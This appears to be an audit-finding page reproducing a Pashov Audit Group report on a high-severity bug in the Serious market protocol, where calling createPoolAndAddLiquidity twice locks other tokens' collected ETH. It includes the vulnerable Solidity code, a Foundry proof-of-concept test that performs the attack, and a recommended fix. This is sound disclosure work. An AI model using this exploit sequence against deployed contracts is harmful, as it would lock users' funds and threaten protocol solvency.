---
tags:
  - lang/solidity
  - sector/dex
  - sector/token
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - fix/use-reentrancy-guard
protocol: "[[Serious]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Serious-security-review.md"
genome:
  - "[[single-function]]"
  - "[[use-reentrancy-guard]]"
  - "[[permanent]]"
  - "[[reentrancy-guard]]"
---
# [C-01] Locking collected ETH by triggering `createPoolAndAddLiquidity` twice

- id: 36317
- impact: HIGH
- protocol: [[Serious]]
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/Serious-security-review.md

## Summary


The bug report describes a vulnerability in the Serious market protocol where an attacker can lock other tokens' collected ETH into their own pool. This can be done by creating a token, fully funding it, and then calling the `createPoolAndAddLiquidity` function. The report includes a proof of concept and recommendations to fix the issue.

## Details

**Severity**

**Impact:** High

**Likelihood:** High

**Description**

When users create a token in the Serious market, it can be funded by calling `buyToken` and providing the required amount of ETH and users will receive the requested amount of the token. Until the token is fully funded (`tokensSold >= tradeableSupply`), the collected ETH will be stored inside the `SeriousMarketProtocol` contract.

Once the token is fully funded, anyone can call `createPoolAndAddLiquidity` to create UniV3 Pool of a token and weth pair and add liquidity in the pool based on the configured `ethAmount` and `tokenAmount`.

```solidity
    function createPoolAndAddLiquidity(address tokenAddress) external nonReentrant returns (address) {
        TokenData memory tokenData = tokenDatas[tokenAddress];
        require(tokenData.token != ERC20Token(address(0)), "Token does not exist");
        require(tokenData.tokensSold >= tradeableSupply, "Not enough tokens sold to create pool");

        uint256 ethAmount = totalLiquidity - poolCreationReward;
        uint256 tokenAmount = _getFractionalTokens(reservedSupply);

        // Disable trading on token
        tokenDatas[tokenAddress].tradingEnabled = false;

        // Convert ETH from contract to WETH
        weth.deposit{value: ethAmount}();

        // Approve the router to spend tokens
        SafeTransferLib.safeApprove(tokenData.token, address(positionManager), tokenAmount);
        require(weth.approve(address(positionManager), ethAmount), "Failed to approve WETH");

        // Create the pool if it doesn't already exist
        address pool = uniswapFactory.getPool(address(weth), tokenAddress, poolFee);
        if (pool == address(0)) {
            pool = uniswapFactory.createPool(address(weth), tokenAddress, poolFee);
            uint160 sqrtPriceX96 = tokenAddress < address(weth) ? sqrtPriceX96WETHToken1 : sqrtPriceX96ERC20Token1;
            IUniswapV3Pool(pool).initialize(sqrtPriceX96);
        }

        // Mint parameters for providing liquidity
        // ...

        // Add liquidity
        (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1) = positionManager.mint(params);

        // Burn the LP token -- don't use safe transfer because it's a contract that doesn't implement receiver
        positionManager.transferFrom(address(this), customNullAddress, tokenId);

        // ...
        return address(pool);
    }
```

However, `createPoolAndAddLiquidity` only sets `tradingEnabled` to false but does not check if the previous value was true. This can be abused by an attacker to lock other tokens' collected ETH into the attacker's pool.

Proof of Concept (PoC):

1. The attacker can create a token, fully fund the token, and then call `createPoolAndAddLiquidity`.
2. After this operation, the attacker donates enough tokens to cover `tokenAmount` to the `SeriousMarketProtocol` contract and triggers `createPoolAndAddLiquidity` for the second time.
   The collected ETH from other tokens will be used to provide liquidity to the attacker's pool.

Coded PoC :

```solidity
    function testAddLiquidityTwice() public {

        uint256 buyAmount = seriousMarket.tradeableSupply();
        uint256 cost = seriousMarket.getEthValueForTradeWithFee(0, int256(buyAmount));
        // this is to mock initial balance inside the market from another token funding
        vm.deal(address(seriousMarket), cost);

        vm.startPrank(ownerAddress);
        vm.deal(ownerAddress, cost);
        console.log("initial eth balance of attacker : ");
        console.log(cost);
        console.log("balance of eth inside market before :");
        console.log(address(seriousMarket).balance);
        seriousMarket.buyToken{value: cost}(address(token), buyAmount, bytes8(0));
        seriousMarket.createPoolAndAddLiquidity(tokenAddress);

        console.log("balance of attacker after first add liquidity :");
        console.log(token.balanceOf(ownerAddress));

        // add liquidity twice
        uint256 reservedSupply = seriousMarket.reservedSupply() * (10 ** 18);
        token.transfer(address(seriousMarket), reservedSupply);
        seriousMarket.createPoolAndAddLiquidity(tokenAddress);
        // swap back to eth
        uint256 swapAmount = token.balanceOf(ownerAddress);
        IV3SwapRouter swapRouter = IV3SwapRouter(swapRouterAddress);
        ERC20(tokenAddress).approve(swapRouterAddress, swapAmount);
        IV3SwapRouter.ExactInputSingleParams memory params = IV3SwapRouter.ExactInputSingleParams({
            tokenIn: tokenAddress,
            tokenOut: wethAddress,
            fee: seriousMarket.poolFee(),
            recipient: ownerAddress,
            amountIn: swapAmount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        uint256 amountOut = swapRouter.exactInputSingle(params);
        console.log("Token balance of attacker after second addLiquidity :");
        console.log(token.balanceOf(ownerAddress));
        console.log("Eth balance of attacker after second addLiquidity :");
        console.log(address(ownerAddress).balance);
        console.log("Eth balance of seriousMarket after second addLiquidity :");
        console.log(address(seriousMarket).balance);
    }
```

Run the test :

```shell
forge test --match-test testAddLiquidityTwice -vvv
```

While this is not a profitable attack, it will cause other tokens' funding to be DoSed and may lead to protocol insolvency due to the lack of ETH liquidity to cover the pool and liquidity creation.

**Recommendations**

Add an additional check inside `createPoolAndAddLiquidity`. if `tradingEnabled` is false, revert the operation.
